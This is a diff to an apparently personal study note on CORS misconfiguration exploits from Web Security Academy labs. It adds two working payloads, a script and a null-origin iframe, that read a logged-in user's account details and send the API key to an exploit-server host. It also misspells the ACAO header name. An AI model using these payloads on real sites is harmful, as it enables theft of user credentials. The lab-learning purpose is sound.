@@ -8,24 +8,64 @@
 4. Exploiting XSS via CORS trust relationships
 5. Breaking TLS with poorly configured CORS
 6. Intranets and CORS without credentials 
+---
 
 ## How to find each type:
 
 1. Server-generated ACAO header from client-specified Origin header
+- Attempt to use a random origin in the `Origin` header.
+- See if the origin is reflected in the  `Access-Allow-Control-Origin` header.
 2. Errors parsing Origin headers
+- See if you can use subdomains or domains that end with the whitelisted domain.
 3. Whitelisted null origin value
+- Put `null` in the origin header and see if it is reflected.
 4. Exploiting XSS via CORS trust relationships
+-
 5. Breaking TLS with poorly configured CORS
+-
 6. Intranets and CORS without credentials 
+-
+---
 
 ## How to exploit each type:
 
 1. Server-generated ACAO header from client-specified Origin header
+```js
+  function getadmin() {
+    var res = JSON.parse(this.response)
+    fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
+}
+
+const request = new XMLHttpRequest();
+request.addEventListener("load", getadmin);
+request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
+request.withCredentials = true;
+request.send();
+```
 2. Errors parsing Origin headers
+- If `normal-website.com` is ok then try `hackersnormal-website.com`.
 3. Whitelisted null origin value
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+var res = JSON.parse(this.response)
+location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?' + res.apikey;
+};
+</script>"></iframe>
+```
 4. Exploiting XSS via CORS trust relationships
+-
 5. Breaking TLS with poorly configured CORS
+-
 6. Intranets and CORS without credentials 
+-
+---
 
 ## Other important notes:
-- Look for the `Access-Allow-Control-Origin` header 
+- Look for the `Access-Allow-Control-Origin` header.
